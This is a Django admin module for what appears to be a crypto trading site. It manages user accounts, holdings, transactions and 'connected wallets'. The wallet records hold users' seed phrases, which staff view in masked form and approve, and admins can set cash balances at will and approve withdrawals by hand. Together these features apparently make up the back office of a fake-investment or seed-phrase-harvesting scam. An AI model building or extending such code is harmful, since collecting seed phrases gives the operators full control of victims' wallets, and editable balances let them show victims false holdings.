from django.contrib import admin
from django.contrib.auth.models import User
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from .models import UserAccount, UserHolding, ConnectedWallet, Transaction


class UserHoldingInline(admin.TabularInline):
    model = UserHolding
    extra = 0
    autocomplete_fields = ['asset']


class UserAccountInline(admin.StackedInline):
    model = UserAccount
    can_delete = False
    fields = ('default_fiat', 'cash_balance')


class UserAdmin(BaseUserAdmin):
    inlines = [UserAccountInline]

admin.site.unregister(User)
admin.site.register(User, UserAdmin)


@admin.register(UserAccount)
class UserAccountAdmin(admin.ModelAdmin):
    list_display = ['user', 'default_fiat', 'balance_usd', 'portfolio_value_usd']
    readonly_fields = ['created_at', 'updated_at', 'balance_usd']
    inlines = [UserHoldingInline]
    fieldsets = [
        ('User', {'fields': ['user', 'default_fiat']}),
        ('Cash Balance', {'fields': ['cash_balance']}),
        ('Portfolio Value (computed)', {'fields': ['balance_usd']}),
        ('Timestamps', {'fields': ['created_at', 'updated_at']}),
    ]

    def save_model(self, request, obj, form, change):
        if change:
            old = UserAccount.objects.get(pk=obj.pk)
            for f in ['cash_balance']:
                old_val = getattr(old, f)
                new_val = getattr(obj, f)
                if old_val != new_val:
                    Transaction.objects.create(
                        account=obj, type='ADMIN_ADJ', status='COMPLETED',
                        fiat_currency='USD',
                        fiat_amount=new_val - old_val,
                        admin_note=form.cleaned_data.get('admin_note', ''),
                        processed_by=request.user,
                        processed_at=__import__('django.utils.timezone').utils.timezone.now(),
                    )
        super().save_model(request, obj, form, change)


@admin.register(UserHolding)
class UserHoldingAdmin(admin.ModelAdmin):
    list_display = ['account', 'asset', 'balance', 'average_entry_price']
    list_filter = ['asset']
    search_fields = ['account__user__username', 'asset__code']


@admin.register(ConnectedWallet)
class ConnectedWalletAdmin(admin.ModelAdmin):
    list_display = ['account', 'wallet_type', 'word_count', 'address', 'status', 'created_at']
    list_filter = ['wallet_type', 'status']
    readonly_fields = ['seed_word_count', 'masked_seed']
    actions = ['approve_wallets', 'reject_wallets']

    def word_count(self, obj):
        return f"{obj.seed_word_count} words"
    word_count.short_description = 'Words'

    def masked_seed(self, obj):
        return obj.masked_seed()
    masked_seed.short_description = 'Seed Phrase'

    def approve_wallets(self, request, queryset):
        from django.utils.timezone import now
        queryset.filter(status='PENDING').update(status='APPROVED', processed_at=now())
        self.message_user(request, "Wallets approved.")
    approve_wallets.short_description = "Approve selected wallets"

    def reject_wallets(self, request, queryset):
        from django.utils.timezone import now
        queryset.filter(status='PENDING').update(status='REJECTED', processed_at=now())
        self.message_user(request, "Wallets rejected.")
    reject_wallets.short_description = "Reject selected wallets"


@admin.register(Transaction)
class TransactionAdmin(admin.ModelAdmin):
    list_display = ['type', 'account', 'status', 'fiat_amount', 'asset_amount', 'destination_address', 'created_at']
    list_filter = ['type', 'status', 'created_at']
    search_fields = ['account__user__username']
    actions = ['approve_transactions', 'reject_transactions']

    def save_model(self, request, obj, form, change):
        if obj.status == 'APPROVED' and obj.processed_at is None:
            self._apply_approval(obj, request.user)
        super().save_model(request, obj, form, change)

    def _apply_approval(self, txn, user):
        from django.utils.timezone import now
        from apps.market.models import MarketAsset
        from .telegram import send_telegram
        if txn.type == 'DEPOSIT':
            if txn.fiat_amount is not None and txn.fiat_amount > 0:
                txn.account.cash_balance += txn.fiat_amount
                txn.account.save(update_fields=['cash_balance'])
            if txn.asset_code and txn.asset_amount is not None:
                amount = txn.asset_amount
                if amount > 0:
                    asset = MarketAsset.objects.get(code=txn.asset_code)
                    h, _ = UserHolding.objects.get_or_create(account=txn.account, asset=asset)
                    h.balance += amount
                    h.save()
            send_telegram(
                f"<b>\u2705 Deposit Approved</b>\n"
                f"User: {txn.account.user.get_full_name() or txn.account.user.email}\n"
                f"{'Fiat: $' + str(txn.fiat_amount) if txn.fiat_amount else ''}"
                f"{'Asset: ' + str(txn.asset_amount) + ' ' + str(txn.asset_code) if txn.asset_code else ''}"
            )
        elif txn.type == 'WITHDRAWAL':
            if txn.fiat_amount is not None and txn.fiat_amount > 0:
                if txn.account.cash_balance < txn.fiat_amount:
                    return
                txn.account.cash_balance -= txn.fiat_amount
                txn.account.save(update_fields=['cash_balance'])
            if txn.asset_code and txn.asset_amount is not None:
                amount = txn.asset_amount
                if amount > 0:
                    asset = MarketAsset.objects.get(code=txn.asset_code)
                    h = UserHolding.objects.filter(account=txn.account, asset=asset).first()
                    if not h or h.balance < amount:
                        return
                    h.balance -= amount
                    h.save()
            send_telegram(
                f"<b>\u2705 Withdrawal Approved</b>\n"
                f"User: {txn.account.user.get_full_name() or txn.account.user.email}\n"
                f"Amount: {txn.asset_amount} {txn.asset_code}"
            )
        txn.processed_at = now()
        txn.processed_by = user

    def approve_transactions(self, request, queryset):
        from django.utils.timezone import now
        approved = 0
        skipped = 0
        for txn in queryset.filter(status='PENDING'):
            self._apply_approval(txn, request.user)
            if txn.processed_at:
                txn.status = 'APPROVED'
                txn.save()
                approved += 1
            else:
                skipped += 1
        msg = f"Approved {approved} transaction(s)."
        if skipped:
            msg += f" {skipped} skipped (insufficient balance)."
        self.message_user(request, msg)
    approve_transactions.short_description = "Approve selected deposits/withdrawals"

    def reject_transactions(self, request, queryset):
        from django.utils.timezone import now
        updated = queryset.filter(status='PENDING').update(status='REJECTED', processed_at=now(), processed_by=request.user)
        self.message_user(request, f"Rejected {updated} transaction(s).")
    reject_transactions.short_description = "Reject selected deposits/withdrawals"
